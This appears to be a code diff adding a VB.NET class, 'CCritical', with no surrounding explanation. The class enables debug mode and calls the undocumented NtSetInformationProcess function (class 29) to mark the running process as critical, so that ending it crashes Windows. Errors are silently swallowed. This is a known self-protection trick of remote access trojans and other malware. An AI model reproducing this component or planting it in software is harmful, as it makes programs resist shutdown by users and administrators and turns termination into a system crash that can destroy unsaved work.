@@ -1,0 +1,26 @@
+﻿Public Class CCritical
+    Public Sub New()
+  Try
+    System.Diagnostics.Process.EnterDebugMode()
+  Catch : End Try
+    End Sub
+
+    Public Sub Enable()
+  AdjustCritical(1)
+    End Sub
+
+    Public Sub Disable()
+  AdjustCritical(0)
+    End Sub
+
+    Private Shared Sub AdjustCritical(ByVal enable As Integer)
+	try
+  NtSetInformationProcess(System.Diagnostics.Process.GetCurrentProcess().Handle, 29, enable, 4)
+  catch : end try
+    End Sub
+
+#Region "WinAPI"
+    <DllImport("ntdll.dll", SetLastError:=True)> Private Shared Function NtSetInformationProcess(ByVal hProcess As System.IntPtr, ByVal processInformationClass As Integer, ByRef processInformation As Integer, ByVal processInformationLength As Integer) As Integer
+    End Function
+#End Region
+End Class
